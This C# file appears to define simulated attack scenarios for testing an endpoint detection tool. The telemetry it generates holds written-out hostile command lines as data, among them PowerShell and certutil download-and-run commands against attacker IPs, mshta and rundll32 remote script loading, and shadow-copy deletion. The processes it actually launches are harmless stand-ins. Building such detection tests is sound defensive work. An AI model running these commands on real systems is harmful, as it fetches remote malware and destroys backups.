using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using Phalanx.Cockpit.Tools;
using Phalanx.Shared.Protos;

namespace Phalanx.Cockpit.Scenarios;

public sealed class AttackScenario
{
    public int Id { get; init; }
    public string Name { get; init; } = string.Empty;
    public string Description { get; init; } = string.Empty;
    public string ExpectedAction { get; init; } = "ACTION_KILL"; // "ACTION_KILL" | "ACTION_RESUME"
    public string AttackType { get; init; } = string.Empty;
    public string ContextScenario { get; init; } = string.Empty;
    public string DefenseGoal { get; init; } = string.Empty;
    public Func<uint, TelemetryBatch> BuildBatch { get; init; } = null!;
    public Func<ProcessStartInfo?>? GetSafeOsProcessInfo { get; init; }
    public Func<ProcessStartInfo?>? GetLiveProcessInfo { get; init; }
}

public static class AttackScenarioRegistry
{
    private static readonly Random Rnd = new();

    public static uint GeneratePid() => (uint)Rnd.Next(10000, 60000);

    public static IReadOnlyList<AttackScenario> AllScenarios { get; } = new List<AttackScenario>
    {
        // --------------------------------------------------------------------
        // [1] Office LOLBAS C2 Dropper
        // --------------------------------------------------------------------
        new()
        {
            Id = 1,
            Name = "Office LOLBAS C2 Dropper",
            Description = "winword.exe ➔ powershell.exe -enc <C2 다운로더> (24μs 선제 동결 ➔ ReAct 3턴 사살)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                uint ppid = 3104;
                string script = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                string fullCmd = $"powershell.exe -w hidden -enc {b64}";

                var batch = new TelemetryBatch();
                // 1. 부모 오피스 프로세스 스냅샷
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "winword.exe",
                    CommandLine = "winword.exe 2026_09_invoice.docm",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                // 2. 동결된 의심 자식 프로세스
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "powershell.exe",
                    CommandLine = fullCmd,
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-w hidden -NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [2] Ransomware Shadow Copy Deletion
        // --------------------------------------------------------------------
        new()
        {
            Id = 2,
            Name = "Ransomware Shadow Copy Deletion",
            Description = "vssadmin.exe delete shadows /all /quiet (C++ 로컬 룰 엔진 0.1ms 현장 사살)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = 1000,
                    ImageName = "vssadmin.exe",
                    CommandLine = "vssadmin.exe delete shadows /all /quiet",
                    IsSuspended = false,
                    IsTerminated = true,
                    Lifecycle = ProcessLifecycle.LifecycleTerminated
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c echo [Simulated vssadmin] && timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                // 호스트 복원 지점 파괴를 방지하기 위해 안전한 vssadmin list shadows 쿼리로 치환 실행
                FileName = "cmd.exe",
                Arguments = "/c vssadmin list shadows & timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [3] LOLBAS CertUtil Remote Payload Download
        // --------------------------------------------------------------------
        new()
        {
            Id = 3,
            Name = "LOLBAS CertUtil Remote Payload Download",
            Description = "excel.exe ➔ certutil.exe -urlcache -split -f http://... (24μs 동결 ➔ 위협 평판 ➔ 사살)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                uint ppid = 2208;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "excel.exe",
                    CommandLine = "excel.exe budget_2026.xlsm",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "certutil.exe",
                    CommandLine = "certutil.exe -urlcache -split -f http://185.220.101.5/malware.exe C:\\Windows\\Temp\\malware.exe",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c echo [Live CertUtil Download] && timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [4] Browser Drive-by HTA Attack
        // --------------------------------------------------------------------
        new()
        {
            Id = 4,
            Name = "Browser Drive-by HTA Attack",
            Description = "msedge.exe ➔ mshta.exe http://... (24μs 동결 ➔ 킬체인 매핑 ➔ 사살)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                uint ppid = 5120;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "msedge.exe",
                    CommandLine = "msedge.exe https://trusted-portal.com",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "mshta.exe",
                    CommandLine = "mshta.exe http://185.220.101.5/invoice.hta",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c echo [Live HTA Emulation] && timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [5] Masquerading Dropper (T1036.005)
        // --------------------------------------------------------------------
        new()
        {
            Id = 5,
            Name = "Masquerading Dropper (T1036.005)",
            Description = "explorer.exe ➔ powershell.exe -enc ... ➔ Temp\\svchost.exe (5턴 심층 수사 ➔ 사살 및 방화벽 차단)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                uint ppid = 1000;
                string script = "(New-Object Net.WebClient).DownloadFile('http://198.51.100.99/update.dat', 'C:\\Windows\\Temp\\svchost.exe'); Start-Process 'C:\\Windows\\Temp\\svchost.exe'";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                string fullCmd = $"powershell.exe -w hidden -enc {b64}";

                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 0,
                    ImageName = "explorer.exe",
                    CommandLine = "C:\\Windows\\explorer.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "powershell.exe",
                    CommandLine = fullCmd,
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });

                // Clean-Room 가상 주입 시 Temp\svchost.exe 모의 파일 텔레메트리 등록 (무서명 시스템 경로 위장 T1036.005)
                FileInspectionTool.RegisterSimulatedFile(@"C:\Windows\Temp\svchost.exe", new FileInspectionTool.SimulatedFileEntry(
                    Exists: true,
                    FileSizeBytes: 124928L,
                    Sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                    Entropy: 7.4521,
                    IsSigned: false,
                    SignerSubject: string.Empty,
                    SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
                    IsPathMasqueraded: true,
                    IsDisguisedExecutable: false,
                    AnomalyScore: 100,
                    DiagnosticReason: "시스템 핵심 바이너리 파일명이 비인가 디렉터리(Temp)에 위치하며 유효한 Microsoft 서명이 결여됨 (T1036.005 Masquerading)"
                ));

                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () =>
            {
                // 실제 OS 디스크에 C:\Windows\Temp\svchost.exe를 생성(비파괴 무해 더미 바이너리)하고 대기하여
                // FileInspectionTool 부재 시의 파일 검증 한계를 직접 실증
                string tempDir = Environment.GetEnvironmentVariable("TEMP") ?? @"C:\Windows\Temp";
                string targetFile = Path.Combine(tempDir, "svchost.exe");
                string psScript = $"[IO.File]::WriteAllText('{targetFile.Replace("\\", "\\\\")}', 'MZ_SIMULATED_PE_PAYLOAD'); Start-Sleep -Seconds 30";
                return new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -Command \"{psScript}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
            }
        },

        // --------------------------------------------------------------------
        // [6] Benign Administrative Script (Known-Good)
        // --------------------------------------------------------------------
        new()
        {
            Id = 6,
            Name = "Benign Admin Script (Known-Good)",
            Description = "explorer.exe ➔ powershell.exe -enc <Get-Service *.internal> (사내 백업 점검 ➔ 무해성 검증 후 정상 복구)",
            ExpectedAction = "ACTION_RESUME",
            BuildBatch = targetPid =>
            {
                uint ppid = 1000;
                string script = "Get-Service -Name '*backup*' | Select-Object Name, Status | Out-File -FilePath '\\\\fileserver.corp.local\\logs\\status.log'";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                string fullCmd = $"powershell.exe -NoProfile -enc {b64}";

                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 0,
                    ImageName = "explorer.exe",
                    CommandLine = "C:\\Windows\\explorer.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "powershell.exe",
                    CommandLine = fullCmd,
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Get-Process; Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [7] SCCM Maintenance Script (False Positive Evasion)
        // --------------------------------------------------------------------
        new()
        {
            Id = 7,
            Name = "SCCM Maintenance Script (False Positive Evasion)",
            Description = "taskhostw.exe ➔ powershell.exe -enc <Base64 WMI Hotfix Audit> (사내 패치 점검 ➔ 무해성 검증 후 정상 복구)",
            ExpectedAction = "ACTION_RESUME",
            BuildBatch = targetPid =>
            {
                uint ppid = 1040;
                string script = "Get-WmiObject -Class Win32_QuickFixEngineering | Where-Object {$_.HotFixID} | Select-Object HotFixID, InstalledOn | Out-File -FilePath '\\\\corp-sccm.internal\\patches\\audit.log'";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                string fullCmd = $"powershell.exe -ExecutionPolicy Bypass -NoProfile -enc {b64}";

                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "taskhostw.exe",
                    CommandLine = "C:\\Windows\\system32\\taskhostw.exe {2227A293-AE67-4503-A5B1-E94A36CE2FBF}",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "powershell.exe",
                    CommandLine = fullCmd,
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Get-WmiObject Win32_QuickFixEngineering; Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [8] Developer Toolchain Loopback IPC (Known-Good)
        // --------------------------------------------------------------------
        new()
        {
            Id = 8,
            Name = "Developer Toolchain Loopback IPC (Known-Good)",
            Description = "code.exe ➔ curl.exe -s http://127.0.0.1:8080/health (로컬 개발 서버 헬스체크 ➔ 무해성 검증 후 정상 복구)",
            ExpectedAction = "ACTION_RESUME",
            BuildBatch = targetPid =>
            {
                uint ppid = 2480;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "code.exe",
                    CommandLine = "C:\\Program Files\\Microsoft VS Code\\Code.exe --unity-launch",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "curl.exe",
                    CommandLine = "curl.exe -s http://127.0.0.1:8080/health -o C:\\Users\\user\\AppData\\Local\\Temp\\health.json",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 15",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 15",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [9] LOLBAS Rundll32 Proxy Execution (T1218.011)
        // --------------------------------------------------------------------
        new()
        {
            Id = 9,
            Name = "LOLBAS Rundll32 Proxy Execution (T1218.011)",
            Description = "explorer.exe ➔ rundll32.exe javascript:... (파워셸 감시 회피 ➔ 24μs 동결 ➔ 위협 평판 ➔ 사살)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                uint ppid = 1000;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 0,
                    ImageName = "explorer.exe",
                    CommandLine = "C:\\Windows\\explorer.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "rundll32.exe",
                    CommandLine = "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://185.220.101.5/beacon.sct\")",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 15",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "rundll32.exe",
                Arguments = "user32.dll,MessageBeep",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [10] Process Injection via Unbacked Memory (T1055)
        // --------------------------------------------------------------------
        new()
        {
            Id = 10,
            Name = "Process Injection via Unbacked Memory (T1055)",
            Description = "spoolsv.exe (정상 명령줄 위장) ➔ VAD 인메모리 DLL 인젝션 (24μs 동결 ➔ VAD 스캔 ➔ 사살)",
            ExpectedAction = "ACTION_KILL",
            BuildBatch = targetPid =>
            {
                uint ppid = 680;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 0,
                    ImageName = "services.exe",
                    CommandLine = "C:\\Windows\\system32\\services.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "spoolsv.exe",
                    CommandLine = "C:\\Windows\\System32\\spoolsv.exe",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });

                // Clean-Room 가상 주입 시 VAD 메모리 인젝션 및 C2 비콘 모의 텔레메트리 등록
                ProcessMemoryScanTool.RegisterSimulatedMemory(targetPid, new SimulatedMemoryEntry(
                    BaseAddress: 0x0000021A4B000000,
                    RegionSize: 65536,
                    Protect: "PAGE_EXECUTE_READWRITE",
                    MemoryType: "MEM_PRIVATE (Unbacked Code Cave / Reflective DLL)",
                    InjectedHeader: "Reflective DLL (MZ Header Detected)",
                    ExtractedIps: new List<string> { "194.165.16.11" },
                    ExtractedUrls: new List<string> { "http://194.165.16.11/beacon" },
                    DetectedKeywords: new List<string> { "virtualalloc", "createremotethread", "reflective dll", "beacon" }
                ));

                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 15",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        }
    };

    public static AttackScenario? FindById(int id) => AllScenarios.FirstOrDefault(s => s.Id == id);
}
